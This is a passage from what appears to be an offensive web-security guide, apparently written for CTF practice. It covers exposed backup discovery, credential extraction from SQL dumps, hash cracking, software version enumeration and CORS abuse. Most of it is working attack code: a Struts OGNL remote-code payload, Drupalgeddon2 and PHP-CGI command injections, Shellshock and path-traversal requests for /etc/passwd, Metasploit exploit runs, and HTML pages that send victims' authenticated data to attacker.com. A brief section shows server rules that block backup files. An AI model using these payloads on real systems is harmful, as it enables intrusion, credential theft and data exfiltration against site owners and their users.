**Vim Swap File Recovery:**

```bash
# Download swap file
curl "https://target.com/.config.php.swp" -o config.php.swp

# Recover content using vim
vim -r config.php.swp

# Or use strings if vim recovery fails
strings config.php.swp > recovered_config.php

# Python script for swap file parsing
cat > parse_swp.py << 'EOF'
#!/usr/bin/env python3
import sys

def extract_from_swp(filename):
    with open(filename, 'rb') as f:
        data = f.read()
    
    # Extract printable strings
    result = []
    current = b''
    
    for byte in data:
        if 32 <= byte <= 126:
            current += bytes([byte])
        else:
            if len(current) > 10:
                result.append(current.decode('ascii', errors='ignore'))
            current = b''
    
    return '\n'.join(result)

if __name__ == "__main__":
    print(extract_from_swp(sys.argv[1]))
EOF

python3 parse_swp.py config.php.swp
```

**Archive and Compressed Backup Discovery:**

```bash
# Common backup archive names
archives=(
    "/backup.zip"
    "/backup.tar"
    "/backup.tar.gz"
    "/backup.tgz"
    "/backup.rar"
    "/site-backup.zip"
    "/www.zip"
    "/public_html.zip"
    "/html.tar.gz"
    "/backup-2024.zip"
    "/backup-01-15-2024.tar.gz"
    "/database.sql.gz"
    "/db_backup.sql"
    "/dump.sql"
    "/mysql.sql"
)

for archive in "${archives[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${archive}")
    if [ "$status" == "200" ]; then
        echo "[+] Found: ${archive}"
        curl -s "https://target.com${archive}" -o "$(basename $archive)"
    fi
done

# Using ffuf for archive discovery
ffuf -u "https://target.com/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/backup-files.txt \
     -mc 200 \
     -fs 0
```

**Date-Based Backup Enumeration:**

Backups often include timestamps:

```bash
# Generate date-based backup names
for year in {2020..2025}; do
    for month in {01..12}; do
        for day in {01..31}; do
            echo "backup-${year}-${month}-${day}.zip"
            echo "backup_${year}${month}${day}.tar.gz"
            echo "db-${year}-${month}-${day}.sql"
        done
    done
done > date_backups.txt

# Test with ffuf
ffuf -u "https://target.com/FUZZ" \
     -w date_backups.txt \
     -mc 200 \
     -t 100

# More targeted approach for recent dates
for i in {0..90}; do
    date=$(date -d "$i days ago" +%Y-%m-%d)
    curl -s -o /dev/null -w "%{http_code} - $date\n" \
         "https://target.com/backup-${date}.zip"
done
```

**Database Backup File Discovery:**

```bash
# Common database backup patterns
db_backups=(
    "/backup.sql"
    "/database.sql"
    "/db.sql"
    "/dump.sql"
    "/mysql.sql"
    "/mysqldump.sql"
    "/data.sql"
    "/db_backup.sql"
    "/database_backup.sql"
    "/sql.sql"
    "/backup/database.sql"
    "/backups/db.sql"
    "/backup.sql.gz"
    "/database.sql.bak"
    "/db.sql.old"
)

for db in "${db_backups[@]}"; do
    echo "[*] Testing: $db"
    curl -s -I "https://target.com${db}" | head -1
done

# Download and analyze SQL dump
curl "https://target.com/backup.sql" -o backup.sql

# Extract sensitive data
grep -i "INSERT INTO users" backup.sql
grep -i "password" backup.sql | head -20
grep -i "email" backup.sql | head -20
grep -i "credit_card" backup.sql
grep -i "admin" backup.sql
```

**Extracting Data from SQL Dumps:**

```bash
# Parse SQL dump for user credentials
cat > parse_sql.py << 'EOF'
#!/usr/bin/env python3
import re
import sys

def parse_sql_dump(filename):
    with open(filename, 'r', errors='ignore') as f:
        content = f.read()
    
    # Find INSERT statements
    inserts = re.findall(r'INSERT INTO `?(\w+)`?.*?VALUES\s*\((.*?)\);', content, re.IGNORECASE | re.DOTALL)
    
    print("[+] Tables with data:")
    for table, values in inserts[:20]:  # Show first 20
        print(f"\nTable: {table}")
        print(f"Values: {values[:200]}")  # First 200 chars
    
    # Extract potential passwords
    print("\n[+] Potential password hashes:")
    hashes = re.findall(r'\b[a-f0-9]{32,64}\b', content)
    for h in set(hashes[:10]):
        print(f"  {h}")
    
    # Extract emails
    print("\n[+] Email addresses:")
    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
    for email in set(emails[:20]):
        print(f"  {email}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <sql_file>")
        sys.exit(1)
    parse_sql_dump(sys.argv[1])
EOF

python3 parse_sql.py backup.sql
```

**Compressed Backup Extraction:**

```bash
# Extract various archive formats
# ZIP files
unzip backup.zip -d extracted/

# List contents without extracting
unzip -l backup.zip

# TAR archives
tar -xzf backup.tar.gz -C extracted/
tar -xjf backup.tar.bz2 -C extracted/
tar -xf backup.tar -C extracted/

# List contents
tar -tzf backup.tar.gz

# RAR archives (requires unrar)
unrar x backup.rar extracted/
unrar l backup.rar  # List contents

# 7z archives
7z x backup.7z -oextracted/
7z l backup.7z  # List contents

# Password-protected archives
# Attempt common passwords
passwords=("password" "123456" "admin" "backup" "root" "")

for pass in "${passwords[@]}"; do
    echo "[*] Trying password: $pass"
    unzip -P "$pass" backup.zip -d extracted/ 2>/dev/null && echo "[+] Success!" && break
done
```

**Source Code in Backup Files:**

```bash
# Download source code backup
curl "https://target.com/www.zip" -o www.zip
unzip www.zip -d source/

# Search for hardcoded credentials
cd source/
grep -r -i "password\s*=\s*['\"]" --include="*.php" --include="*.py" --include="*.js"
grep -r -i "api[_-]key\s*=\s*['\"]" --include="*.php" --include="*.py" --include="*.js"

# Find database connections
grep -r -i "mysql_connect\|mysqli\|PDO\|pg_connect" --include="*.php"
grep -r -i "createConnection\|MongoClient" --include="*.js"

# Extract configuration files
find . -name "config.*" -o -name "settings.*" -o -name ".env"

# Find authentication/authorization code
grep -r -i "isAdmin\|checkPermission\|authorize" --include="*.php" --include="*.py"
```

**Automated Backup Finder Tools:**

Custom backup discovery script:

```bash
cat > backup_finder.sh << 'EOF'
#!/bin/bash

TARGET="$1"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

echo "[*] Scanning for backup files on: $TARGET"

# Get list of discovered files from initial scan
echo "[*] Discovering files..."
ffuf -u "$TARGET/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200,301,302 \
     -o discovered.json \
     -of json \
     -s

# Extract filenames
cat discovered.json | jq -r '.results[].url' | sed "s|$TARGET||" > files.txt

# Generate backup variations
echo "[*] Generating backup variations..."
while read file; do
    echo "${file}.bak"
    echo "${file}.backup"
    echo "${file}.old"
    echo "${file}~"
    echo "${file}.save"
    echo "${file}.swp"
    echo ".${file}.swp"
    echo "${file}.tmp"
    echo "${file}.orig"
done < files.txt > backup_variations.txt

# Test backup variations
echo "[*] Testing backup file variations..."
ffuf -u "$TARGET/FUZZ" \
     -w backup_variations.txt \
     -mc 200,403 \
     -o backup_results.json \
     -of json

# Display results
echo "[+] Found backups:"
cat backup_results.json | jq -r '.results[] | "\(.status) - \(.url)"'

# Cleanup
rm discovered.json files.txt backup_variations.txt
EOF

chmod +x backup_finder.sh
./backup_finder.sh "https://target.com"
```

**WordPress Backup Discovery:**

WordPress sites frequently have exposed backups:

```bash
# Common WordPress backup locations
wp_backups=(
    "/wp-content/backup.zip"
    "/wp-content/backups/"
    "/wp-backup/"
    "/backups/"
    "/backup/"
    "/wp-content/updraft/"
    "/wp-content/ai1wm-backups/"
    "/wp-content/uploads/backwpup/"
    "/wordpress.sql"
    "/wp-config.php.bak"
    "/wp-config.php~"
    "/wp-config.php.old"
)

for backup in "${wp_backups[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${backup}")
    echo "${backup}: ${status}"
done

# WordPress configuration backup
curl "https://target.com/wp-config.php.bak" -o wp-config.php.bak

# Extract database credentials
grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST" wp-config.php.bak
```

**Backup Directory Listing:**

```bash
# Check for directory indexing on backup folders
curl -s "https://target.com/backup/" | grep -i "index of"
curl -s "https://target.com/backups/" | grep -i "index of"
curl -s "https://target.com/old/" | grep -i "index of"

# Parse directory listing for files
curl -s "https://target.com/backup/" | grep -oP 'href="[^"]*"' | cut -d'"' -f2

# Download all files from indexed directory
curl -s "https://target.com/backup/" | \
    grep -oP 'href="[^"]*"' | \
    cut -d'"' -f2 | \
    while read file; do
        if [[ "$file" != "/" ]] && [[ "$file" != "../" ]]; then
            echo "[*] Downloading: $file"
            curl -s "https://target.com/backup/${file}" -o "$file"
        fi
    done
```

**Incremental Backup Discovery:**

```bash
# Backups may use incremental naming
prefixes=("backup" "site" "www" "database" "db")
extensions=("zip" "tar" "tar.gz" "tgz" "sql" "sql.gz")

for prefix in "${prefixes[@]}"; do
    for ext in "${extensions[@]}"; do
        for i in {1..10}; do
            url="https://target.com/${prefix}-${i}.${ext}"
            status=$(curl -s -o /dev/null -w "%{http_code}" "$url")
            if [ "$status" == "200" ]; then
                echo "[+] Found: ${prefix}-${i}.${ext}"
                curl -s "$url" -o "${prefix}-${i}.${ext}"
            fi
        done
    done
done
```

**Cloud Storage Backup Exposure:**

Backups may be stored in misconfigured cloud storage:

```bash
# AWS S3 bucket enumeration
buckets=(
    "backup"
    "backups"
    "company-backup"
    "prod-backup"
    "site-backup"
)

for bucket in "${buckets[@]}"; do
    echo "[*] Testing: $bucket"
    aws s3 ls "s3://${bucket}" --no-sign-request
done

# Using s3scanner
git clone https://github.com/sa7mon/S3Scanner
cd S3Scanner
pip3 install -r requirements.txt

# Scan for open buckets
python3 s3scanner.py --bucket-file bucket_names.txt

# Azure Blob Storage
# Format: https://{account}.blob.core.windows.net/{container}/{blob}
curl "https://company.blob.core.windows.net/backup/database.sql"

# Google Cloud Storage
curl "https://storage.googleapis.com/company-backups/backup.tar.gz"
```

**Metadata in Backup Files:**

Backup archives may contain metadata revealing information:

```bash
# ZIP file metadata
unzip -l backup.zip | head -20

# Look for timestamps
unzip -l backup.zip | grep "2024"

# Check for sensitive paths
unzip -l backup.zip | grep -iE "passwd|shadow|config|secret"

# TAR archive metadata
tar -tvf backup.tar | head -20

# Extract specific file without extracting all
tar -xzf backup.tar.gz path/to/config.php

# Check file ownership in archive
tar -tvf backup.tar | awk '{print $2}' | sort -u
```

**Hash Cracking from Backup Databases:**

```bash
# Extract password hashes from SQL dump
grep -oP "'\$2[ayb]\$[0-9]{2}\$[./A-Za-z0-9]{53}'" backup.sql > hashes.txt

# Identify hash types
hashid -m hashes.txt

# Crack bcrypt hashes with hashcat
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack MD5 hashes
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Using John the Ripper
john --format=bcrypt hashes.txt
john --show hashes.txt
```

**Preventing Access to Backup Files:**

[Inference] While not exploitation, understanding prevention helps identify misconfigurations:

```bash
# .htaccess rules to block backup file access
cat > .htaccess << 'EOF'
<FilesMatch "\.(bak|backup|old|save|swp|tmp|~)$">
    Order allow,deny
    Deny from all
</FilesMatch>

# Block hidden files
<FilesMatch "^\.">
    Order allow,deny
    Deny from all
</FilesMatch>
EOF

# Nginx configuration
cat > nginx_backup_block.conf << 'EOF'
location ~* \.(bak|backup|old|save|swp|tmp)$ {
    deny all;
    return 404;
}

location ~ /\. {
    deny all;
    return 404;
}
EOF
```

**Comprehensive Backup Scan Automation:**

Full automation script combining all techniques:

```bash
cat > comprehensive_backup_scan.sh << 'EOF'
#!/bin/bash

TARGET="$1"
OUTPUT_DIR="backup_scan_$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR"

echo "[*] Starting comprehensive backup scan on: $TARGET"

# 1. Common backup files
echo "[*] Phase 1: Common backup file patterns"
ffuf -u "$TARGET/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/backup-files.txt \
     -mc 200,403 \
     -o common_backups.json \
     -of json \
     -s

# 2. Configuration files
echo "[*] Phase 2: Configuration files"
ffuf -u "$TARGET/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/config-files.txt \
     -mc 200,403 \
     -o config_files.json \
     -of json \
     -s

# 3. Editor backup patterns
echo "[*] Phase 3: Editor backup files"
cat > editor_backups.txt << 'EOL'
.index.php.swp
.config.php.swp
index.php~
config.php~
.index.php.swo
.config.php.swo
EOL

ffuf -u "$TARGET/FUZZ" \
     -w editor_backups.txt \
     -mc 200 \
     -o editor_backups.json \
     -of json \
     -s

# 4. Date-based backups (last 30 days)
echo "[*] Phase 4: Date-based backups"
for i in {0..30}; do
    date=$(date -d "$i days ago" +%Y-%m-%d)
    echo "backup-${date}.zip"
    echo "backup-${date}.tar.gz"
    echo "db-${date}.sql"
done > date_backups.txt

ffuf -u "$TARGET/FUZZ" \
     -w date_backups.txt \
     -mc 200 \
     -o date_backups.json \
     -of json \
     -s

# 5. Git/SVN exposure
echo "[*] Phase 5: Version control exposure"
curl -s -o /dev/null -w "%{http_code} - .git/config\n" "$TARGET/.git/config"
curl -s -o /dev/null -w "%{http_code} - .svn/entries\n" "$TARGET/.svn/entries"

# Combine results
echo "[+] Results summary:"
cat *.json | jq -r '.results[] | "\(.status) - \(.url)"' | sort -u > found_files.txt
cat found_files.txt

echo "[*] Scan complete. Results in: $OUTPUT_DIR"
EOF

chmod +x comprehensive_backup_scan.sh
./comprehensive_backup_scan.sh "https://target.com"
```

**Key Tools Summary:**

- **ffuf/gobuster**: Fast file and directory discovery
- **bfac**: Specialized backup file artifact checker
- **git-dumper**: Extract exposed .git repositories
- **svn-extractor**: Extract exposed .svn repositories
- **truffleHog**: Secret scanning in git repositories
- **hashcat/John**: Password hash cracking
- **curl/wget**: Manual file retrieval
- **vim**: Swap file recovery
- **Custom scripts**: Targeted backup pattern generation

---

**Important Related Topics:**

- **Directory Traversal/Path Traversal**: Accessing backup files outside web root through ../../ sequences
- **Information Disclosure**: Combining configuration exposure with other vulnerabilities
- **Credential Stuffing**: Using discovered credentials across services
- **Source Code Analysis**: Manual review of recovered source code for vulnerabilities
- **Cloud Security Misconfigurations**: S3 bucket permissions, Azure Blob access controls
- **Secrets Management**: Vault, environment variable injection, encrypted secrets
- **Web Application Firewalls (WAF)**: Bypassing WAF rules during backup discovery
- **Automated Scanning Integration**: Incorporating these checks into CI/CD pipelines

---

## Unpatched Software

### Version Detection and Enumeration

**Web server version detection:**

```bash
# HTTP header analysis
curl -I http://target.com
# Look for: Server: Apache/2.4.29 (Ubuntu)
# Server: nginx/1.14.0
# Server: Microsoft-IIS/7.5

# Verbose headers
curl -v http://target.com 2>&1 | grep -i "server:"

# Multiple methods
whatweb http://target.com -v
whatweb http://target.com --aggression=3

# Wappalyzer CLI
wappalyzer http://target.com

# Nmap version detection
nmap -sV -p 80,443 target.com --version-intensity 9
```

**Application framework version detection:**

```bash
# PHP version from headers
curl -I http://target.com/index.php
# Look for: X-Powered-By: PHP/7.2.24

# ASP.NET version
curl -I http://target.com/default.aspx
# Look for: X-AspNet-Version: 4.0.30319
# X-Powered-By: ASP.NET

# Ruby on Rails detection
curl http://target.com -I | grep "X-Runtime"

# Express.js/Node.js
curl http://target.com -I | grep "X-Powered-By: Express"

# WordPress version
curl http://target.com/readme.html | grep "Version"
curl http://target.com/wp-includes/js/jquery/jquery.js | head -n 5

# Drupal version
curl http://target.com/CHANGELOG.txt | head -n 3

# Joomla version
curl http://target.com/administrator/manifests/files/joomla.xml | grep "<version>"
```

**CMS-specific version enumeration:**

```bash
# WordPress detailed
wpscan --url http://target.com --enumerate vp,vt,u

# Drupal
droopescan scan drupal -u http://target.com

# Joomla
joomscan -u http://target.com

# Magento
magescan scan:all http://target.com
```

**JavaScript library versions:**

```bash
# jQuery version
curl http://target.com | grep -oP "jquery[.-](\d+\.)+\d+"

# Bootstrap version
curl http://target.com | grep -oP "bootstrap[.-](\d+\.)+\d+"

# Angular/React version
curl http://target.com | grep -oP "(angular|react)[.-](\d+\.)+\d+"

# Automated detection
retire --js --jspath http://target.com
```

**Application server version detection:**

```bash
# Tomcat version from error pages
curl http://target.com/nonexistent.jsp
# Look for: Apache Tomcat/8.5.50

# Tomcat manager detection
curl http://target.com:8080/manager/html -I

# JBoss/WildFly version
curl http://target.com:8080/console -I

# WebLogic version
curl http://target.com:7001/console/login/LoginForm.jsp | grep -i "WebLogic"

# IIS version from error pages
curl http://target.com/nonexistent
# Parse error page for version info
```

### Database Version Detection

**MySQL/MariaDB version:**

```bash
# Direct connection
mysql -h target.com -u root -p -e "SELECT VERSION();"

# Via SQL injection
curl "http://target.com/product?id=1' UNION SELECT @@version--+"

# Nmap script
nmap -p 3306 --script mysql-info target.com
```

**PostgreSQL version:**

```bash
# Direct connection
psql -h target.com -U postgres -c "SELECT version();"

# Via SQL injection
curl "http://target.com/product?id=1' UNION SELECT version()--+"

# Nmap script
nmap -p 5432 --script pgsql-brute target.com
```

**MSSQL version:**

```bash
# Via SQL injection
curl "http://target.com/product?id=1' UNION SELECT @@version--+"

# Nmap script
nmap -p 1433 --script ms-sql-info target.com
```

**MongoDB version:**

```bash
# Direct connection
mongo mongodb://target.com:27017 --eval "db.version()"

# HTTP status interface (if enabled)
curl http://target.com:28017/
```

**Redis version:**

```bash
# Direct connection
redis-cli -h target.com INFO server | grep redis_version

# Nmap script
nmap -p 6379 --script redis-info target.com
```

### SSH/SSL/TLS Version Detection

**SSH version and vulnerabilities:**

```bash
# Banner grabbing
nc target.com 22
# Output: SSH-2.0-OpenSSH_7.4

# Detailed analysis
nmap -p 22 --script ssh2-enum-algos target.com

# Vulnerability scanning
nmap -p 22 --script ssh-auth-methods,ssh-publickey-acceptance target.com

# Check for specific vulnerabilities
ssh-audit target.com
```

**SSL/TLS version and cipher enumeration:**

```bash
# Test SSL/TLS versions
nmap --script ssl-enum-ciphers -p 443 target.com

# Detailed SSL analysis
sslyze --regular target.com:443

# TestSSL.sh (comprehensive)
testssl.sh target.com:443

# Check for specific vulnerabilities
nmap --script ssl-heartbleed,ssl-poodle,ssl-dh-params target.com -p 443
```

### Vulnerability Correlation

**Searchsploit - Local exploit database:**

```bash
# Search by application name and version
searchsploit apache 2.4.29
searchsploit "nginx 1.14"
searchsploit "wordpress 5.2"

# More specific search
searchsploit -t apache 2.4.29 remote

# Copy exploit to working directory
searchsploit -m 12345

# Online search
searchsploit -w apache 2.4.29

# Update database
searchsploit -u
```

**CVE database lookup:**

```bash
# Using cve-search (local CVE database)
git clone https://github.com/cve-search/cve-search.git
cd cve-search
./sbin/db_mgmt_cpe_dictionary.py -p
./sbin/db_mgmt_json.py -p

# Query for specific product
python3 bin/search.py -p apache:http_server:2.4.29

# Web-based: https://cve.mitre.org/
# NVD: https://nvd.nist.gov/
```

**Automated vulnerability scanning with Nmap:**

```bash
# Vuln category scripts
nmap --script vuln target.com -p-

# Specific vulnerability checks
nmap --script http-vuln-* target.com -p 80,443

# CVE-specific scripts
nmap --script http-vuln-cve2017-5638 target.com -p 80,443

# With version detection
nmap -sV --script vulners target.com -p-
```

**Nuclei vulnerability templates:**

```bash
# Update templates
nuclei -update-templates

# Scan for CVEs
nuclei -u http://target.com -t cves/

# Specific year
nuclei -u http://target.com -t cves/2021/

# Specific CVE
nuclei -u http://target.com -t cves/2021/CVE-2021-41773.yaml

# Technology-specific
nuclei -u http://target.com -t cves/ -tags apache
```

### Common Unpatched Vulnerabilities

**Apache vulnerabilities:**

```bash
# CVE-2021-41773 - Path Traversal (Apache 2.4.49)
curl "http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# CVE-2021-42013 - Path Traversal (Apache 2.4.50)
curl "http://target.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"

# CVE-2017-15715 - File Upload Bypass
# Upload shell.php\x0A as shell.php[newline]

# Testing with Nuclei
nuclei -u http://target.com -t cves/2021/CVE-2021-41773.yaml
```

**Nginx vulnerabilities:**

```bash
# CVE-2013-4547 - Space-based bypass
curl "http://target.com/protected/../ /etc/passwd"

# Integer overflow (older versions)
# CVE-2013-2028

# Off-by-one (CVE-2017-7529)
curl -H "Range: bytes=0-18446744073709551615" http://target.com/large_file
```

**PHP vulnerabilities:**

```bash
# CVE-2019-11043 - PHP-FPM RCE
# Requires specific nginx misconfiguration
# Testing tool:
go get github.com/neex/phuip-fpizdam
phuip-fpizdam http://target.com/index.php

# CVE-2021-21702 - SSRF via filter
curl "http://target.com/page.php?file=php://filter/resource=http://internal-server/"

# CVE-2012-1823 - CGI argument injection
curl "http://target.com/index.php?-s"
curl "http://target.com/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php system('id'); ?>"
```

**WordPress vulnerabilities:**

```bash
# CVE-2019-8943 - Path Traversal
curl "http://target.com/wp-admin/post.php?post=1&action=edit&meta-box-loader=1&_wpnonce=NONCE&meta-box-loader-nonce=NONCE&_wp_http_referer=/wp-admin/post.php?post=1%26action%3Dedit"

# CVE-2019-17671 - View Private/Draft Posts
curl "http://target.com/?static=1&p=POST_ID"

# Plugin vulnerabilities (example)
wpscan --url http://target.com --enumerate vp --plugins-detection aggressive
```

**Struts vulnerabilities:**

```bash
# CVE-2017-5638 - Apache Struts RCE
curl -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" http://target.com/

# Automated detection
python struts-pwn.py --check http://target.com
```

**Drupal vulnerabilities:**

```bash
# Drupalgeddon2 (CVE-2018-7600)
curl -X POST http://target.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax -d "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"

# Drupalgeddon3 (CVE-2018-7602)
# Requires authentication

# Automated testing
python drupalgeddon2.py http://target.com
```

**Shellshock (CVE-2014-6271):**

```bash
# Test via User-Agent
curl -H "User-Agent: () { :; }; echo; echo vulnerable" http://target.com/cgi-bin/test.cgi

# Test via Referer
curl -H "Referer: () { :; }; /bin/cat /etc/passwd" http://target.com/cgi-bin/test.cgi

# Automated testing
nmap -p 80 --script http-shellshock --script-args uri=/cgi-bin/test.cgi target.com
```

### Metasploit Exploit Modules

**Searching for exploits:**

```bash
msfconsole

# Search by CVE
search cve:2021 type:exploit

# Search by application
search apache type:exploit
search wordpress type:exploit

# Search by platform
search platform:linux type:exploit
```

**Common exploit modules:**

```bash
# Apache Struts CVE-2017-5638
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS target.com
set RPORT 8080
set TARGETURI /struts2-showcase/
run

# Drupalgeddon2
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS target.com
set RPORT 80
run

# Shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS target.com
set TARGETURI /cgi-bin/test.cgi
run

# WordPress plugin exploit (example)
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS target.com
set USERNAME admin
set PASSWORD password123
run
```

### Automated Patch Level Assessment

**Custom version checker script:**

```python
#!/usr/bin/env python3
import requests
import re
import json

def check_versions(url):
    """Detect software versions and check for known vulnerabilities"""
    
    results = {}
    
    try:
        # Get HTTP headers
        response = requests.get(url, timeout=5)
        headers = response.headers
        
        # Check Server header
        if 'Server' in headers:
            server = headers['Server']
            results['server'] = server
            
            # Parse version
            if 'Apache' in server:
                version_match = re.search(r'Apache/(\d+\.\d+\.\d+)', server)
                if version_match:
                    version = version_match.group(1)
                    results['apache_version'] = version
                    
                    # Check against known vulnerable versions
                    vulnerable_versions = ['2.4.49', '2.4.50']
                    if version in vulnerable_versions:
                        results['apache_vulnerable'] = True
                        results['apache_cves'] = ['CVE-2021-41773', 'CVE-2021-42013']
            
            elif 'nginx' in server:
                version_match = re.search(r'nginx/(\d+\.\d+\.\d+)', server)
                if version_match:
                    version = version_match.group(1)
                    results['nginx_version'] = version
        
        # Check X-Powered-By
        if 'X-Powered-By' in headers:
            powered_by = headers['X-Powered-By']
            results['powered_by'] = powered_by
            
            if 'PHP' in powered_by:
                version_match = re.search(r'PHP/(\d+\.\d+\.\d+)', powered_by)
                if version_match:
                    version = version_match.group(1)
                    results['php_version'] = version
        
        # Check WordPress
        wp_readme = requests.get(f"{url}/readme.html", timeout=5)
        if wp_readme.status_code == 200:
            version_match = re.search(r'Version (\d+\.\d+\.\d*)', wp_readme.text)
            if version_match:
                results['wordpress_version'] = version_match.group(1)
        
        # Check for common vulnerable endpoints
        vulnerable_paths = {
            '/cgi-bin/': 'Shellshock possible',
            '/.git/config': 'Git repository exposed',
            '/.env': 'Environment file exposed',
            '/phpinfo.php': 'PHP info exposed',
        }
        
        for path, description in vulnerable_paths.items():
            test_url = f"{url}{path}"
            resp = requests.get(test_url, timeout=5)
            if resp.status_code == 200:
                results[f'exposed_{path}'] = description
        
    except requests.exceptions.RequestException as e:
        results['error'] = str(e)
    
    return results

# Usage
url = "http://target.com"
results = check_versions(url)
print(json.dumps(results, indent=2))
```

**Dependency checking for web applications:**

```bash
# Node.js/npm vulnerabilities
npm audit

# Python vulnerabilities
pip-audit
safety check

# Ruby vulnerabilities
bundle audit

# PHP Composer vulnerabilities
composer audit

# For web apps found during CTF
retire --js --path /path/to/webroot
```

## Insecure CORS Configuration

### CORS Basics

Cross-Origin Resource Sharing (CORS) allows servers to specify which origins can access their resources. Misconfigurations can lead to unauthorized data access.

**CORS headers:**

- `Access-Control-Allow-Origin` - Specifies allowed origins
- `Access-Control-Allow-Credentials` - Allows cookies/credentials
- `Access-Control-Allow-Methods` - Allowed HTTP methods
- `Access-Control-Allow-Headers` - Allowed request headers
- `Access-Control-Expose-Headers` - Headers accessible to scripts

### Detecting CORS Misconfiguration

**Manual testing:**

```bash
# Test with arbitrary origin
curl -H "Origin: http://evil.com" -I http://target.com/api/data

# Look for reflection
# Access-Control-Allow-Origin: http://evil.com
# Access-Control-Allow-Credentials: true

# Test with null origin
curl -H "Origin: null" -I http://target.com/api/data

# Test with subdomain
curl -H "Origin: http://attacker.target.com" -I http://target.com/api/data

# Test with crafted origin
curl -H "Origin: http://target.com.evil.com" -I http://target.com/api/data
```

**Automated CORS testing script:**

```python
#!/usr/bin/env python3
import requests
import sys

def test_cors(url):
    """Test CORS configuration for misconfigurations"""
    
    test_origins = [
        "http://evil.com",
        "http://attacker.com",
        "null",
        "http://target.com.evil.com",
        "http://evil.target.com",
        "https://evil.com",
    ]
    
    print(f"[*] Testing CORS on: {url}\n")
    
    for origin in test_origins:
        headers = {'Origin': origin}
        
        try:
            response = requests.get(url, headers=headers, timeout=5)
            
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')
            
            if acao:
                print(f"[+] Origin: {origin}")
                print(f"    Access-Control-Allow-Origin: {acao}")
                print(f"    Access-Control-Allow-Credentials: {acac}")
                
                # Check for vulnerabilities
                if acao == origin and acac == 'true':
                    print(f"    [!] VULNERABLE: Origin reflected with credentials!")
                elif acao == '*' and acac == 'true':
                    print(f"    [!] MISCONFIGURATION: Wildcard with credentials")
                elif acao == origin:
                    print(f"    [!] POTENTIALLY VULNERABLE: Origin reflected")
                elif acao == 'null':
                    print(f"    [!] VULNERABLE: Null origin accepted")
                
                print()
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Error testing {origin}: {e}")

# Usage
if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <url>")
    sys.exit(1)

test_cors(sys.argv[1])
```

**Burp Suite CORS testing:**

```
1. Capture request in Proxy
2. Send to Repeater
3. Add/modify Origin header: Origin: http://evil.com
4. Send request
5. Observe Access-Control-Allow-Origin in response
6. Test with Access-Control-Allow-Credentials: true
```

### Common CORS Vulnerabilities

**1. Origin Reflection Vulnerability:**

```bash
# Request
curl -H "Origin: http://attacker.com" \
  http://target.com/api/user/profile

# Vulnerable Response
# Access-Control-Allow-Origin: http://attacker.com
# Access-Control-Allow-Credentials: true
```

[**Inference:** This allows attacker-controlled origin to read authenticated responses]

**Exploitation:**

```html
<!-- Attacker's page at http://attacker.com/steal.html -->
<html>
<body>
<script>
fetch('http://target.com/api/user/profile', {
    method: 'GET',
    credentials: 'include'  // Send cookies
})
.then(response => response.json())
.then(data => {
    // Exfiltrate data
    fetch('http://attacker.com/log?data=' + btoa(JSON.stringify(data)));
})
.catch(error => console.error('Error:', error));
</script>
</body>
</html>
```

**2. Null Origin Vulnerability:**

```bash
# Request
curl -H "Origin: null" \
  http://target.com/api/sensitive

# Vulnerable Response
# Access-Control-Allow-Origin: null
# Access-Control-Allow-Credentials: true
```

**Exploitation:**

```html
<!-- Iframe sandbox creates null origin -->
<html>
<body>
<iframe sandbox="allow-scripts allow-top-navigation" 
        srcdoc="
<script>
fetch('http://target.com/api/sensitive', {
    credentials: 'include'
})
.then(r => r.text())
.then(data => {
    parent.postMessage(data, '*');
});
</script>
"></iframe>

<script>
window.addEventListener('message', function(e) {
    // Exfiltrate data
    fetch('http://attacker.com/log?data=' + btoa(e.data));
});
</script>
</body>
</html>
```

**3. Subdomain Wildcard Bypass:**

```bash
# Request
curl -H "Origin: http://attacker.target.com" \
  http://target.com/api/data

# Vulnerable Response (regex bypass)
